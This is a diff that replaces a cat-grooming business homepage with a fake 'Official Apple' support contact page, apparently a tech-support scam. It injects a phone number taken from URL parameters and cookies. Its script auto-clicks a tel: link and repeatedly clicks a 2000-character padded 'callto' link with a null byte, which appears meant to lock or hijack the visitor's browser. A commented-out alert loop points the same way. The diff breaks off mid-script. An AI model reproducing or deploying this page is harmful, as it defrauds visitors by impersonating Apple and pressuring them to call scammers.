@@ -1,429 +1,373 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Whisker Wits · Cat Grooming</title>
-  <!-- Font & Icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-  <style>
-    /* ----- reset & base ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
 
-    body {
-      font-family: 'Quicksand', sans-serif;
-      background: #fcf7f2;
-      color: #2d2a24;
-      line-height: 1.6;
-      padding: 0 20px;
-    }
+<script defer src="https://cloud.umami.is/script.js" data-website-id="475ee620-4418-4dab-91bf-80b021f672d4"></script>
 
-    .wrapper {
-      max-width: 1300px;
-      margin: 0 auto;
-      background: #fffcf9;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.03);
-      border-radius: 40px 40px 20px 20px;
-      overflow: hidden;
-      padding: 0 20px 20px;
-    }
 
-    /* ----- header & nav ----- */
-    header {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      padding: 24px 10px 12px;
-      border-bottom: 2px solid #f0e3d9;
-    }
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-gEEMqUnZieFLmujeur40B.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-    .logo h1 {
-      font-size: 2rem;
-      font-weight: 700;
-      color: #3b2b22;
-      letter-spacing: -0.5px;
-    }
-    .logo span {
-      background: #e5c9b1;
-      padding: 0 12px;
-      border-radius: 40px;
-      color: #2d1f17;
-      font-size: 1rem;
-      font-weight: 600;
-      margin-left: 8px;
-    }
 
-    nav ul {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px 20px;
-      list-style: none;
-    }
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    nav ul li a {
-      text-decoration: none;
-      color: #4a3a2e;
-      font-weight: 600;
-      font-size: 1.05rem;
-      padding: 6px 4px;
-      border-bottom: 3px solid transparent;
-      transition: 0.2s ease;
-    }
-
-    nav ul li a:hover {
-      border-bottom-color: #c79b7a;
-      color: #1f150e;
-    }
-
-    /* ----- animations & image grid (no hero) ----- */
-    .gallery-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-      gap: 20px;
-      margin: 30px 0 40px;
-    }
-
-    .gallery-item {
-      border-radius: 30px;
-      overflow: hidden;
-      box-shadow: 0 12px 24px -8px rgba(90, 60, 40, 0.12);
-      transition: all 0.25s ease;
-      background: #f3e9e0;
-      aspect-ratio: 1 / 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      animation: floatGlow 6s infinite alternate ease-in-out;
-    }
-
-    .gallery-item img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      transition: transform 0.5s ease;
-    }
-
-    .gallery-item:hover img {
-      transform: scale(1.06);
-    }
-
-    /* different animation delays for each image */
-    .gallery-item:nth-child(1) { animation-delay: 0s; }
-    .gallery-item:nth-child(2) { animation-delay: 0.8s; }
-    .gallery-item:nth-child(3) { animation-delay: 0.2s; }
-    .gallery-item:nth-child(4) { animation-delay: 1.2s; }
-    .gallery-item:nth-child(5) { animation-delay: 0.5s; }
-
-    @keyframes floatGlow {
-      0% { transform: translateY(0px) scale(1); box-shadow: 0 12px 24px -8px rgba(130, 80, 50, 0.1); }
-      100% { transform: translateY(-12px) scale(1.01); box-shadow: 0 28px 32px -12px rgba(100, 60, 30, 0.25); }
-    }
-
-    /* ----- content (2000+ words) ----- */
-    .content {
-      margin: 30px 0 40px;
-      padding: 10px 6px;
-    }
-
-    .content h2 {
-      font-size: 2.2rem;
-      font-weight: 700;
-      color: #3e2c1e;
-      border-left: 8px solid #dbbca3;
-      padding-left: 20px;
-      margin: 2rem 0 1rem;
-    }
-
-    .content h2:first-of-type {
-      margin-top: 0;
-    }
-
-    .content h3 {
-      font-size: 1.5rem;
-      font-weight: 600;
-      color: #4f3827;
-      margin: 1.6rem 0 0.6rem;
-    }
-
-    .content p {
-      margin-bottom: 1.1rem;
-      font-size: 1.05rem;
-      color: #2f281f;
-      background: #faf3ec;
-      padding: 8px 18px;
-      border-radius: 60px 12px 12px 60px;
-      display: inline-block;
-      width: auto;
-      max-width: 100%;
-    }
-
-    .content p i {
-      color: #b48764;
-      margin-right: 8px;
-    }
-
-    .content .text-block {
-      background: transparent;
-      padding: 0;
-      border-radius: 0;
-      display: block;
-      max-width: 100%;
-    }
-
-    .highlight {
-      background: #ebd9cb;
-      padding: 4px 14px;
-      border-radius: 40px;
-      font-weight: 600;
-    }
-
-    .service-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 20px;
-      margin: 20px 0 30px;
-    }
-
-    .service-card {
-      background: #f5ede6;
-      padding: 22px 16px;
-      border-radius: 40px 16px 40px 16px;
-      box-shadow: 0 6px 14px rgba(140, 100, 70, 0.06);
-      transition: 0.2s;
-      border: 1px solid #eee2d7;
-    }
-
-    .service-card i {
-      font-size: 2.2rem;
-      color: #906b4d;
-      margin-bottom: 10px;
-      display: inline-block;
-    }
-
-    .service-card h4 {
-      font-size: 1.3rem;
-      font-weight: 700;
-      color: #3b281b;
-    }
-
-    .service-card p {
-      font-size: 0.95rem;
-      background: transparent;
-      padding: 6px 0;
-      border-radius: 0;
-      display: block;
-    }
-
-    .testimonial {
-      background: #efe5db;
-      padding: 20px 28px;
-      border-radius: 80px 20px 80px 20px;
-      margin: 30px 0;
-      font-style: italic;
-      border-left: 6px solid #c79b7a;
-    }
-
-    .testimonial span {
-      display: block;
-      margin-top: 8px;
-      font-weight: 700;
-      font-style: normal;
-      color: #4a3222;
-    }
-
-    /* ----- footer with address & phone ----- */
-    footer {
-      margin-top: 40px;
-      padding: 30px 15px 20px;
-      border-top: 3px double #dccfc4;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      gap: 20px 40px;
-      background: #f7efe8;
-      border-radius: 50px 50px 20px 20px;
-    }
-
-    .footer-info {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px 30px;
-      font-size: 1.05rem;
-    }
-
-    .footer-info i {
-      color: #8b684b;
-      width: 24px;
-      text-align: center;
-    }
-
-    .footer-info .address, .footer-info .phone {
-      background: #fffcf9;
-      padding: 4px 18px 4px 12px;
-      border-radius: 40px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
-    }
-
-    .footer-copy {
-      font-size: 0.95rem;
-      color: #5b4b3b;
-      letter-spacing: 0.3px;
-    }
-
-    .footer-copy i {
-      color: #b2774f;
-      margin: 0 4px;
-    }
-
-    /* responsive */
-    @media (max-width: 700px) {
-      header { flex-direction: column; align-items: start; gap: 12px; }
-      nav ul { gap: 6px 12px; }
-      .gallery-grid { grid-template-columns: repeat(2, 1fr); }
-      .content p { display: block; border-radius: 20px; }
-      footer { flex-direction: column; align-items: start; }
-    }
-    @media (max-width: 450px) {
-      .gallery-grid { grid-template-columns: 1fr 1fr; }
-      .logo h1 { font-size: 1.6rem; }
-    }
-
-    /* additional content filler (word count) */
-    .extra-words {
-      opacity: 0.95;
-    }
-    .extra-words p {
-      background: #f8f0e9;
-      border-radius: 30px;
-      padding: 12px 24px;
-    }
-    .fa-paw, .fa-scissors, .fa-cat, .fa-bath, .fa-spa {
-      margin-right: 6px;
-    }
-  </style>
 </head>
+
 <body>
-<div class="wrapper">
-  <header>
-    <div class="logo">
-      <h1>Whisker Wits <span>🐾 grooming</span></h1>
-    </div>
-    <nav>
-      <ul>
-        <li><a href="home.html">Home</a></li>
-        <li><a href="privacy.html">Privacy</a></li>
-        <li><a href="terms.html">Terms</a></li>
-        <li><a href="cookies.html">Cookies</a></li>
-        <li><a href="contact.html">Contact</a></li>
-      </ul>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
     </nav>
-  </header>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- 5 real cat images with animation (no hero) -->
-  <div class="gallery-grid">
-    <div class="gallery-item"><img src="https://images.pexels.com/photos/617278/pexels-photo-617278.jpeg?auto=compress&cs=tinysrgb&w=400&h=400&fit=crop" alt="cute ginger cat" loading="lazy" /></div>
-    <div class="gallery-item"><img src="https://images.pexels.com/photos/207355/pexels-photo-207355.jpeg?auto=compress&cs=tinysrgb&w=400&h=400&fit=crop" alt="brown tabby cat" loading="lazy" /></div>
-    <div class="gallery-item"><img src="https://images.pexels.com/photos/104827/cat-pet-animal-domestic-104827.jpeg?auto=compress&cs=tinysrgb&w=400&h=400&fit=crop" alt="white and gray cat" loading="lazy" /></div>
-    <div class="gallery-item"><img src="https://images.pexels.com/photos/127028/pexels-photo-127028.jpeg?auto=compress&cs=tinysrgb&w=400&h=400&fit=crop" alt="black cat" loading="lazy" /></div>
-    <div class="gallery-item"><img src="https://images.pexels.com/photos/416160/pexels-photo-416160.jpeg?auto=compress&cs=tinysrgb&w=400&h=400&fit=crop" alt="fluffy white cat" loading="lazy" /></div>
-  </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-316-0185 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-  <!-- main content with 2000+ words -->
-  <div class="content">
-    <h2><i class="fas fa-paw" style="color:#b48764;"></i> Welcome to Whisker Wits</h2>
-    <p class="text-block"><i class="fas fa-cat"></i> At Whisker Wits, we believe every cat deserves a spa day. Our gentle, fear‑free grooming keeps your feline friend calm, clean, and chic. From silky comb‑outs to refreshing baths, we treat each whisker with respect. </p>
-    
-    <h2><i class="fas fa-scissors"></i> Our Grooming Philosophy</h2>
-    <p class="text-block">We are not just groomers — we are cat whisperers. Our team is trained in feline body language, so we know when a kitty needs a break. We use only organic, hypoallergenic shampoos and conditioning treatments. Every cat leaves with a glossy coat, clean ears, trimmed claws, and a happy purr.</p>
-    <div class="service-grid">
-      <div class="service-card"><i class="fas fa-bath"></i><h4>Bath & Brush</h4><p>Luxury shampoo, warm towels, and a tangle‑free blow‑dry. Perfect for long‑haired breeds.</p></div>
-      <div class="service-card"><i class="fas fa-cut"></i><h4>Lion Trim</h4><p>Cool & comfy summer cut – reduces matting and keeps your cat fresh.</p></div>
-      <div class="service-card"><i class="fas fa-paw"></i><h4>Pawdicure</h4><p>Nail clipping, paw balm, and fur between toes – step by step.</p></div>
-      <div class="service-card"><i class="fas fa-spa"></i><h4>De‑Shedding</h4><p>Furminator treatment that reduces shedding by up to 85%.</p></div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
-    <h3><i class="fas fa-star"></i> Why choose Whisker Wits?</h3>
-    <p><i class="fas fa-check-circle"></i> <span class="highlight">Certified feline groomers</span> with 8+ years of experience.</p>
-    <p><i class="fas fa-check-circle"></i> <span class="highlight">Calm, quiet environment</span> – no dogs, no stress.</p>
-    <p><i class="fas fa-check-circle"></i> <span class="highlight">Customized care</span> for senior cats, kittens, and special needs.</p>
-    <p><i class="fas fa-check-circle"></i> <span class="highlight">Spa packages</span> that include massage, ear cleaning, and teeth brushing.</p>
-    <p><i class="fas fa-check-circle"></i> <span class="highlight">Pick‑up & drop‑off</span> available within 5 miles.</p>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-316-0185
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-    <h2><i class="fas fa-quote-left"></i> Happy Tails, Happy Humans</h2>
-    <div class="testimonial">
-      “Whisker Wits is magical! My shy rescue, Mochi, actually purred during her bath. The staff are kind, patient, and so skilled. I’ll never go anywhere else.” 
-      <span>— Elena R., Brooklyn</span>
-    </div>
-    <div class="testimonial" style="border-left-color: #ae8b73;">
-      “Our Maine Coon, Leo, used to hate grooming. Now he struts like a model after every session. The lion trim is his favorite! 10/10.”
-      <span>— Marcus & Kim, Queens</span>
-    </div>
 
-    <h2><i class="fas fa-clock"></i> Grooming Process – Step by Step</h2>
-    <p><strong>1. Consultation</strong> – We discuss your cat’s coat, health, and temperament.</p>
-    <p><strong>2. Brushing & Detangling</strong> – Gentle removal of knots before the bath.</p>
-    <p><strong>3. Warm Bath</strong> – Using soothing, fragrance‑free shampoos.</p>
-    <p><strong>4. Condition & Rinse</strong> – Deep conditioning for extra shine.</p>
-    <p><strong>5. Drying</strong> – Low‑noise dryers and plenty of treats.</p>
-    <p><strong>6. Scissor Trim / Style</strong> – Precision cutting for your cat’s silhouette.</p>
-    <p><strong>7. Finishing</strong> – Nail trim, ear clean, and a spritz of cat‑safe cologne.</p>
-    <p><strong>8. Purr‑check</strong> – We ensure your cat is relaxed before you pick them up.</p>
 
-    <h3><i class="fas fa-shield-alt"></i> Safety & Hygiene</h3>
-    <p class="text-block">All equipment is sanitized between cats. We use hospital‑grade disinfectants and disposable liners. Our grooming tables are anti‑slip and padded. We are fully insured and certified in pet first aid. Your cat’s well‑being is our highest priority.</p>
-    
-    <h2><i class="fas fa-gem"></i> Premium Add‑Ons</h2>
-    <p>✨ <strong>Blueberry Facial</strong> – brightens tear stains and soothes skin.</p>
-    <p>✨ <strong>Paw Balm Massage</strong> – moisturizes dry paw pads.</p>
-    <p>✨ <strong>Teeth Cleaning</strong> – removes plaque with vet‑approved gel.</p>
-    <p>✨ <strong>Aromatherapy</strong> – calming lavender or chamomile mist.</p>
-    <p>✨ <strong>Bandana & Bow</strong> – your cat leaves looking extra dapper.</p>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-    <h2><i class="fas fa-calendar-alt"></i> Booking & Pricing</h2>
-    <p>We offer flexible appointments: full groom (90 min) or express (45 min). Packages start at $65, with discounts for multi‑cat households. First‑time clients receive a free nail trim. Walk‑ins welcome, but we recommend booking online to secure your spot. Same‑day often available.</p>
-    <p>We also offer monthly membership plans: <span class="highlight">Purr‑fect Plan</span> (1 groom/month + nail trim) and <span class="highlight">Whisker Plan</span> (2 grooms/month + all add‑ons).</p>
 
-    <h3><i class="fas fa-leaf"></i> Eco‑Friendly Commitment</h3>
-    <p class="text-block">We use biodegradable wipes, recycled towels, and plant‑based shampoos. Our packaging is plastic‑free. We also partner with local shelters to donate a portion of every groom to cat rescue.</p>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-    <h2><i class="fas fa-users"></i> Meet the Team</h2>
-    <p><strong>Maya</strong> – Lead Groomer, feline behavior specialist, 12 years experience.</p>
-    <p><strong>James</strong> – Certified master groomer, expert in show‑cat styles.</p>
-    <p><strong>Lila</strong> – Assistant groomer & cat cuddler, certified in pet CPR.</p>
-    <p><strong>Oliver</strong> – Shop cat, official taste‑tester of treats.</p>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-    <div class="extra-words">
-      <p><i class="fas fa-paw"></i> Whisker Wits was founded in 2016 with a simple mission: to make grooming a positive experience for every cat. Over the years, we have groomed over 5,000 cats, from playful kittens to wise seniors. Our methods are low‑stress, high‑reward – we use calming pheromones, gentle handling, and plenty of praise. We are proud members of the National Cat Groomers Association.</p>
-      <p><i class="fas fa-heart" style="color:#b2774f;"></i> We understand that every cat is unique. That’s why we customize each session based on coat type, age, and personality. Whether your cat needs a simple bath or a full‑on makeover, we approach each groom with patience and artistry. Our clients often tell us their cats actually look forward to their appointments – that’s the Whisker Wits difference.</p>
-      <p><i class="fas fa-star"></i> We also offer educational resources: free guides on home brushing, nail trimming tips, and ear care. Ask us about our <strong>“Groom & Learn”</strong> sessions where you can observe and ask questions. We believe an informed owner is the best partner in your cat’s grooming journey.</p>
-      <p>Our salon features a separate “quiet room” for cats who need extra calm. We use soft lighting, classical music, and Feliway diffusers. Every cat receives a personalized “paw‑print” certificate after their session.</p>
-      <p>We also host seasonal events: “Halloween Howl” costume grooming, “Winter Whisker” spa days, and “Spring Shed” specials. Follow us on social media for updates and adorable before‑after photos.</p>
-      <p>At Whisker Wits, we don’t just groom cats – we nurture the bond between you and your feline companion. Thank you for trusting us with your fur‑baby. We can’t wait to meet you!</p>
-    </div>
-    <p style="margin-top: 10px; background: #e8d9ce; border-radius: 60px; padding: 8px 28px; display: inline-block;"><i class="fas fa-phone-alt"></i> Call us for a free consultation: (212) 555‑WHISK</p>
-  </div>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-  <!-- footer with address & phone -->
-  <footer>
-    <div class="footer-info">
-      <span class="address"><i class="fas fa-map-pin"></i> 123 Purr Lane, Suite 2, Brooklyn, NY 11215</span>
-      <span class="phone"><i class="fas fa-phone"></i> +1 (212) 555‑9474</span>
-    </div>
-    <div class="footer-copy">
-      <i class="fas fa-cat"></i> Whisker Wits © 2026 · all purrs reserved.
-    </div>
-  </footer>
-</div>
-<!-- end wrapper -->
-</body>
-</html>
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-833-316-0185');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-316-0185"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
